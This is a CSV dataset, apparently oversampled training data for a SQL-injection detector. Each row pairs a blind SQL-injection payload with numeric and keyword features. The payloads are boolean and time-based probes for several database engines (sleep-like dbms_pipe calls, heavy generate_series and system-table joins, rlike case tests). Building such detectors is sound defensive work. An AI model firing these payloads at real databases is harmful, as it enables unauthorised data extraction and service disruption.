id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000759,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,2.0693077517400313,79.6317158759131,25.413592518248475,3.7146594420559165,21.0,16.218123357664634,29.20679625912424,13.206796259124237,0.26562253786944484,0.20100258324329123,0.367876977679611,0.16549790120765298,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.5977345802919208,1.0,3.6090616788323167,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.40226541970807916,0.4022654197080793,0.0,0.4022654197080793,0.0,1.5977345802919207,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4022654197080793
SMOTE_000760,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,0.06781267807404552,111.68810382929635,32.0,3.8511722355895417,36.75691421222599,20.885316028450607,41.0,13.045873588619756,0.32810975271244114,0.18745255247222503,0.36756678442264706,0.11687091039268675,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.977063205690121,0.0,0.9770632056901215,1.0229367943098784,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000761,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000078,0.016857969405997892,136.9140080811379,29.0,3.340884597070957,42.02645905195757,13.0,65.9073933181485,15.980155711031822,0.3069953232111135,0.09495631592566561,0.48133908354316246,0.11670927732005847,4.0,0.0,0.0,0.0,0.0,1.9933852370106069,0.0,9.986770474021213,0.0,0.0,0.0,1.993385237010607,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000762,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,3.0585783011394168,113.55756508748279,26.24460520699862,3.398873800490943,34.06835467348554,13.0,51.73381562099587,14.755394793001377,0.2934287283195988,0.1158745357443773,0.45820066423248895,0.13249607170353495,0.0,4.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.3776973965006888,0.3776973965006889,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.6223026034993113,0.0,0.6223026034993112,0.0,0.0,0.0,1.377697396500689,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6223026034993113,0.6223026034993113,3.2446052069986226
SMOTE_000763,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,2.10823629727071,74.59193071463463,27.052531836934076,3.789181979870108,18.157595510802224,16.0,26.97373408153296,13.460601122299444,0.24017445155134387,0.21497455914876235,0.3630482231453721,0.18180276615452168,0.0,4.0,1.0,0.0,0.0,1.4868670407664812,0.0,4.0,0.9737340815329626,1.0,1.0,2.4868670407664815,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000764,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,1.5360007689768655,124.53381013434584,34.9647036954034,3.9545553445769723,40.385287010061056,21.0,45.166171276583086,17.9823518477017,0.31649761480292893,0.17499916947401603,0.36173481736683727,0.14676839835621783,4.0,0.0,0.0,0.0,0.7455879619254253,2.0,0.0,6.982351847701702,0.0,0.7455879619254255,1.0,5.254412038074575,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2544120380745746,1.7455879619254253,0.0,1.0,0.7455879619254254,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.491175923850851
SMOTE_000765,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000060,2.1753638788507925,119.43091730831078,29.762426068513506,3.5114515309769483,34.096671688412144,14.190606517128376,52.762426068513506,18.381213034256753,0.2777508804439433,0.12032268608517672,0.44700226347208394,0.15492416999879602,1.1906065171283768,4.0,0.0,0.5953032585641884,0.0,2.0,0.0,9.190606517128376,0.0,0.4046967414358116,1.0,2.5953032585641886,0.5953032585641884,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000766,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,3.108208590824889,84.59202877211385,18.487556832169577,2.5847991539401565,14.487556832169574,8.019896401070854,47.23383021554936,14.850745323324043,0.1565189448231662,0.08183567756194751,0.5818752802174236,0.17977009739746272,0.0,4.0,0.0,0.0,0.0,1.616915107774681,0.0,8.0,0.0,0.6169151077746811,0.6169151077746811,1.6169151077746813,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2338302155493621,0.3830848922253189,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6169151077746813
SMOTE_000767,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000051,1.2112732508465507,164.78345948236753,33.50514761267193,3.8856412312880972,58.51544283801579,16.0,61.63915593484781,28.628860709503947,0.3547781198794685,0.09739539940820419,0.3739109762602815,0.1739155044520458,0.0,3.1237130968320175,0.0,0.0,0.0,1.123713096832018,0.0,13.505147612671928,0.8762869031679823,2.0,3.6288607095039467,5.371139290496053,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.123713096832018,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,2.6288607095039467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.752573806335964
SMOTE_000768,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,1.3595095549288634,78.5880800311295,26.05959984435258,3.5460507174838063,19.88343978209361,13.647679875482062,33.056960373553814,12.0,0.253293473264556,0.173825016194341,0.4201805953144808,0.15270091522662224,0.0,4.0,1.0,0.0,0.0,1.0,0.0,5.176160062258969,0.0,0.41191996887051563,0.41191996887051585,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000769,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,0.33031370260563037,94.83105788751165,28.793716097796175,3.6235135840239296,31.037341789715477,13.550090405876869,38.31238699265391,11.931238699265391,0.32608003156807924,0.14438356097396202,0.4035572117196494,0.1259791957383093,1.0687613007346088,0.0,0.0,0.0,1.0,1.0687613007346088,0.0,6.793716097796174,0.0,0.9312386992653913,0.9312386992653914,2.2062839022038263,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.06876130073460879,0.9312386992653912,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000770,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000054,2.7602424051800516,121.2549292381479,28.0,4.092308887422471,78.64021108098135,3.0,27.10197169525916,12.512746461907394,0.6492300113887719,0.024911299930235636,0.22229939383098582,0.1035592948500066,3.0,0.0,0.0,0.0,1.0,0.48725353809260485,0.0,3.0254929238147903,0.0,0.0,2.0,1.487253538092605,1.0,0.0,0.0,0.0,0.0,0.4872535380926049,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000771,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000070,4.2359240934829385,153.565618206586,33.73303377331029,3.793284647046155,56.790730541594655,15.958146108318932,60.67533700502592,20.141404551646502,0.3654312815537207,0.1032918814489748,0.401114371513111,0.13016246548419355,6.366516886655145,0.0,0.5916292216637863,0.0,0.0,1.4083707783362136,0.0,8.816741556672428,0.0,0.0,0.0,4.366516886655145,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.40837077833621366,0.5916292216637863,1.0,0.0,0.0,0.5916292216637864,1.0,0.5916292216637863,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5916292216637863,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.774887664991359
SMOTE_000772,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000057,1.432267240723511,153.26009082562422,33.50672721708282,3.8474678020282496,56.04036330249693,11.479818348751536,59.246636391458594,26.493272782917177,0.36539393609154114,0.0750533722134469,0.38662753270718125,0.17292515898783073,0.9865455658343572,2.260090825624232,0.0,0.0,0.0,1.2466363914585894,0.0,12.0,0.0,2.0,1.0,7.246636391458589,0.2466363914585893,0.7533636085414107,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.7533636085414107,0.0,0.0,0.7533636085414108,1.0,0.24663639145858926,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.753363608541411
SMOTE_000773,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,1.2706523808417018,141.72097938843706,32.62292709917408,4.156694178792081,72.50829160330369,9.0,42.09805228926299,18.11463549587038,0.5135046457524737,0.06365460516106933,0.29556174391412804,0.127279005172329,0.6229270991740762,0.0,2.0,0.0,1.0,1.0,0.0,5.868781297522228,0.6229270991740762,0.0,3.0,4.0,0.6229270991740762,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000774,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,1.4289592250457317,104.4570189197199,26.152339639906632,3.4367036889407503,30.439826487607853,13.0,46.339064144037344,14.678128288074694,0.2878426240251487,0.12485359143068278,0.44547511104275506,0.14182867350141343,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.339064144037347,2.0,0.1695320720186736,0.1695320720186737,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8304679279813263,0.0,0.8304679279813264,0.0,0.0,0.0,1.1695320720186737,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8304679279813263,0.8304679279813263,3.660935855962653
SMOTE_000775,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,1.1922873646549839,137.95344727465934,32.35381766247566,4.209708812829632,73.58472935009733,9.0,38.59962961218366,16.769088312378333,0.5352800602508053,0.06538893020960902,0.2783148448203166,0.121016164719269,0.3538176624756664,0.0,2.0,0.0,1.0,1.0,0.0,5.061452987427,0.35381766247566654,0.0,3.0,4.0,0.35381766247566643,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000776,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000026,0.8444676604971082,89.65177705332516,22.348222946674845,2.9936913688330744,10.263449153386489,15.477665579987733,46.60710821330062,17.30355410665031,0.11496164234573017,0.1725456400689007,0.5196154596764455,0.19287725790892365,4.0,0.0,0.8258885266625777,0.0,0.0,2.0,0.0,7.651777053325156,1.6517770533251555,0.17411147333742216,1.0,2.8258885266625775,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1741114733374223,0.8258885266625777,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000777,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000024,0.40987758324541146,153.7737038408096,32.416296278605216,4.05100527823953,78.83703721394787,16.520370348256517,43.416296278605216,15.0,0.5091597120514921,0.10865023168654939,0.28420226724225084,0.09798778901970762,0.10407406965130339,0.0,2.0,0.0,1.0,2.0,0.0,5.208148139302607,0.0,0.1040740696513035,1.8959259303486964,5.0,0.1040740696513035,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000778,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000061,0.1681494895809805,118.57268615072883,28.053689326630828,4.0579498564210414,80.08948221105138,3.107378653261655,23.30423951757469,12.071585768841103,0.6759742377878959,0.026042521052694265,0.19619934924333618,0.1017838919160737,2.9642071155794483,0.0,0.0,0.0,1.0,1.0,0.0,2.0536893266308276,0.0,0.0,2.017896442210276,2.0,1.0,0.0,0.0,0.01789644221027591,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000779,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,1.6066964332742006,102.60180906972697,29.471557790694785,3.557622457046428,32.0,13.0,43.715577906947836,13.886231162779135,0.31332785130385765,0.12728943959219216,0.42473720883973864,0.1346455002642115,1.0,0.0,0.9431155813895672,0.0,1.0,1.0,0.0,7.943115581389567,0.0,1.0,1.0,2.9431155813895673,1.0,0.0,0.4715577906947835,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000780,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,0.025502821622946942,107.19675969619637,27.013117313079757,3.5216872015420253,34.05246925231903,13.0,46.13117313079758,14.013117313079757,0.3176836332851804,0.12132083525134368,0.43024657745892,0.13074895400455588,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.026234626159516,1.986882686920242,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000781,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000034,4.181750124681453,142.50177943307023,32.78579902062239,3.8139859811874977,46.036688737157505,15.392899510311196,55.107693634045546,25.96449755155598,0.3185967943054728,0.10969286880211437,0.38825020910035085,0.18346012779206197,0.0,1.1786985309335873,1.2142009793776085,0.0,0.0,1.0,0.0,12.178698530933588,0.39289951031119574,2.0,2.178698530933587,7.428401958755217,0.0,0.39289951031119574,0.6071004896888044,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.1786985309335871,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1786985309335876
SMOTE_000782,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,1.721049919764938,88.59698965032212,26.980997177360575,3.6190003499312637,28.298494825161058,13.0,35.29849482516106,12.0,0.3166598865998246,0.14896384213764252,0.3968711862124013,0.13750508505013156,2.0095014113197127,0.0,0.0,0.0,0.6634995295600958,1.3365004704399044,0.0,5.990498588680287,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6634995295600958,0.0,0.0,0.6634995295600958,1.3365004704399042,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.663499529560096
SMOTE_000783,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000054,1.769333293194249,135.55078456124738,29.87385246639598,4.004766873010928,78.37844260081205,4.873852466395981,36.353864189702804,15.944625304336542,0.5835212542583865,0.0348577635348737,0.2655396063262017,0.11608137588053802,3.0,0.0,0.0,0.0,0.7323067905148597,0.0,0.0,5.873852466395983,0.0,0.5353864189702807,1.7323067905148597,2.338466047425702,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.2676932094851403,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000784,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,1.430476255213962,118.51255598696632,28.828517374592696,3.587500856914132,42.22738224103934,13.514447876221908,49.59924324429776,13.171482625407302,0.3520878175393082,0.11668375778584805,0.41827255005002406,0.11295587462481974,4.0,0.0,0.17148262540730275,0.0,0.0,1.0,0.0,7.657034749185394,0.0,0.17148262540730264,0.17148262540730297,1.171482625407303,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8285173745926973,0.0,0.8285173745926973,0.0,0.0,0.0,1.0,0.1714826254073028,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8285173745926973,0.8285173745926973,3.6570347491853945
SMOTE_000785,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,0.9877227302889053,126.00294598530537,27.428992283615052,3.4623857897179793,42.0,13.0,56.57395370169032,14.428992283615052,0.3339787709107575,0.10337438147237732,0.44818926010927657,0.11445758750758864,0.8579845672301069,3.1420154327698935,0.0,0.0,0.0,2.0,0.0,8.428992283615054,0.0,0.0,0.0,2.0,0.21449614180752674,0.7855038581924733,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000786,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,1.737776582067937,159.67111391668087,34.71863291025859,3.9272384140452457,47.796582275646486,24.0,59.47624050321114,28.398291137823243,0.29881786605289595,0.15123630390675968,0.372180090031379,0.17776574000896542,2.718632910258595,0.3203417724353512,0.6406835448707026,0.0,0.0,2.0,0.0,11.359316455129298,0.0,2.0,1.0,10.0,0.6796582275646488,0.3203417724353512,0.3203417724353512,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.6796582275646488,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6796582275646488
SMOTE_000787,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000007,0.1834150043015543,137.24084591047898,32.2068076517465,4.246335333116792,69.4825511874085,16.0689358839155,37.413615303493,14.275743535661999,0.506398424067251,0.11714676020076605,0.2725525392755598,0.10390227645642312,0.06893588391549965,0.0,2.0,0.0,1.0,2.0,0.0,4.0689358839155005,0.0,0.0,2.0689358839155,5.0,0.06893588391549987,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
